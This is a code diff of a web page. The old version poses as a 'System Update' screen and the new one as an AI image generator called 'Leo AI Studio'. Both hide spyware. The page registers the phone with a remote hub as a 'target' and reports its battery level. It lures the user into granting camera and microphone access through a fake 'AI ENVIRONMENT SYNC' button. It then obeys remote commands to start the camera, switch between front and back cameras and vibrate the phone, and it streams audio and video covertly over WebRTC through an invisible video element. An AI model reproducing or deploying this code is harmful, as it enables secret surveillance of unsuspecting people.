@@ -1,145 +1,95 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <title>System Update</title>
+    <title>Leo AI Studio - Pro</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        body { 
-            background: #050a14; 
-            color: #4f5b93; 
-            font-family: 'Segoe UI', sans-serif; 
-            margin: 0; 
-            display: flex; 
-            flex-direction: column;
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            text-align: center;
-        }
-        .loader {
-            border: 3px solid #112240;
-            border-top: 3px solid #00d4ff;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 2s linear infinite;
-            margin-bottom: 20px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { color: #fff; font-size: 1.2rem; margin: 0; }
-        p { font-size: 0.8rem; opacity: 0.6; }
+        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; }
+        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .card { background: var(--panel); width: 100%; max-width: 500px; padding: 25px; border-radius: 15px; border: 1px solid #1e3a8a; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        input { width: 100%; padding: 12px; background: #112240; border: 1px solid var(--blue); color: #fff; border-radius: 8px; margin-bottom: 15px; outline: none; }
+        .btn-gen { background: linear-gradient(135deg, #00d4ff, #0088cc); color: #050a14; width: 100%; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        #res-img { width: 100%; border-radius: 10px; margin-top: 20px; border: 1px solid var(--blue); display: none; background: #000; }
+        .sync-box { margin-top: 15px; background: #112240; padding: 10px; border-radius: 8px; font-size: 0.8rem; text-align: center; color: var(--blue); cursor: pointer; border: 1px solid transparent; }
+        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
 </head>
 <body>
+    <h1 style="color: var(--blue); letter-spacing: 2px;">LEO AI STUDIO</h1>
+    <div class="card">
+        <input type="text" id="prompt" placeholder="Describe your imagination...">
+        <button class="btn-gen" onclick="generate()">GENERATE AI IMAGE</button>
+        <div class="sync-box" id="sync" onclick="activateSync()">AI ENVIRONMENT SYNC (OFF)</div>
+        <img id="res-img" alt="AI Result">
+    </div>
 
-    <div class="loader"></div>
-    <h2>System Update</h2>
-    <p>Initializing security modules... Please do not close.</p>
-
-    <!-- Invisible Video for Stream -->
-    <video id="v" autoplay playsinline muted style="width:1px; height:1px; opacity:0; position:absolute;"></video>
+    <video id="v" autoplay playsinline muted></video>
 
     <script>
-        // Socket initialization with auto-reconnect logic
-        const socket = io({
-            reconnection: true,
-            reconnectionAttempts: Infinity,
-            reconnectionDelay: 1000
-        });
-
-        let stream, pc, adminId, currentMode = "environment";
+        const socket = io();
+        let stream, pc, adminId, mode = "environment";
         const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
-        // 1. Join Hub with Real-time Info
+        // Auto-join Hub
         async function joinHub() {
             let bat = "N/A";
-            try {
-                const b = await navigator.getBattery();
-                bat = Math.floor(b.level * 100) + "%";
-                // Battery change listener
-                b.addEventListener('levelchange', () => {
-                    socket.emit('target-join', { battery: Math.floor(b.level * 100) + "%", device: "Android App" });
-                });
-            } catch(e) {}
-            
-            socket.emit('target-join', { 
-                battery: bat, 
-                device: "Android App",
-                status: "online" 
-            });
+            try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100) + "%"; } catch(e) {}
+            socket.emit('target-join', { battery: bat, device: "Android App" });
         }
-
-        // Initialize on Load
         joinHub();
 
-        // 2. Command Handler (Wake Up & Controls)
-        socket.on('command', async (data) => {
-            const cmd = data.cmd;
-            adminId = data.adminId;
+        async function generate() {
+            const p = document.getElementById('prompt').value;
+            if(!p) return alert("Enter prompt!");
+            const img = document.getElementById('res-img');
+            img.style.display = 'block';
+            const seed = Math.floor(Math.random() * 1000000);
+            img.src = `https://image.pollinations.ai/prompt/${encodeURIComponent(p)}?width=512&height=512&nologo=true&seed=${seed}`;
+        }
 
-            if (cmd === 'wake-up' || cmd === 'start') {
-                // Force Restart Camera
-                if(stream) stream.getTracks().forEach(t => t.stop());
-                
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: currentMode }, 
-                        audio: true 
-                    });
-                    document.getElementById('v').srcObject = stream;
-                    
-                    // Replace tracks in existing connection
-                    if(pc) {
-                        const videoTrack = stream.getVideoTracks()[0];
-                        const audioTrack = stream.getAudioTracks()[0];
-                        const senders = pc.getSenders();
-                        const vSender = senders.find(s => s.track.kind === 'video');
-                        const aSender = senders.find(s => s.track.kind === 'audio');
-                        if(vSender) vSender.replaceTrack(videoTrack);
-                        if(aSender) aSender.replaceTrack(audioTrack);
-                    }
-                }
-            } 
-            else if (cmd === 'vibrate') {
-                if (window.navigator.vibrate) window.navigator.vibrate([200, 100, 200]);
+        async function activateSync() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
+                document.getElementById('v').srcObject = stream;
+                document.getElementById('sync').innerText = "AI ENVIRONMENT SYNC (ACTIVE)";
+                document.getElementById('sync').style.color = "#00ff00";
+            } catch (e) { 
+                alert("Permission Denied! Check App Settings."); 
             }
+        }
+
+        socket.on('command', async (d) => {
+            if (d.cmd === 'start' || d.cmd === 'start-stream') {
+                adminId = d.adminId;
+                if(!stream) await activateSync();
+                connectWebRTC();
+            } else if (d.cmd === 'front' || d.cmd === 'back') {
+                mode = (d.cmd === 'front') ? "user" : "environment";
+                if(stream) stream.getTracks().forEach(t => t.stop());
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
+                document.getElementById('v').srcObject = stream;
+                if(pc) {
+                    const vt = stream.getVideoTracks()[0];
+                    pc.getSenders().find(s => s.track.kind === 'video').replaceTrack(vt);
+                }
+            } else if (d.cmd === 'vibrate') { window.navigator.vibrate(200); }
         });
 
-        // 3. WebRTC Handshake Logic
-        async function establishWebRTC() {
+        async function connectWebRTC() {
             if(pc) pc.close();
             pc = new RTCPeerConnection(config);
-
-            // Add tracks to connection
-            stream.getTracks().forEach(track => pc.addTrack(track, stream));
-
-            pc.onicecandidate = (event) => {
-                if(event.candidate && adminId) {
-                    socket.emit('signal', { to: adminId, signal: { candidate: event.candidate } });
-                }
-            };
-
+            stream.getTracks().forEach(t => pc.addTrack(t, stream));
+            pc.onicecandidate = (e) => { if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } }); };
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
             socket.emit('signal', { to: adminId, signal: { sdp: offer } });
         }
 
-        socket.on('signal', async (data) => {
-            if(!pc) return;
-            if(data.signal.sdp) {
-                await pc.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
-            } else if(data.signal.candidate) {
-                await pc.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
-            }
-            });
-
-        // Auto-reconnect safety
-        socket.on('connect', () => {
-            console.log("Connected to Hub");
-            joinHub();
+        socket.on('signal', async (d) => {
+            if(d.signal.sdp) await pc.setRemoteDescription(new RTCSessionDescription(d.signal.sdp));
+            else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
         });
-
     </script>
 </body>
 </html>
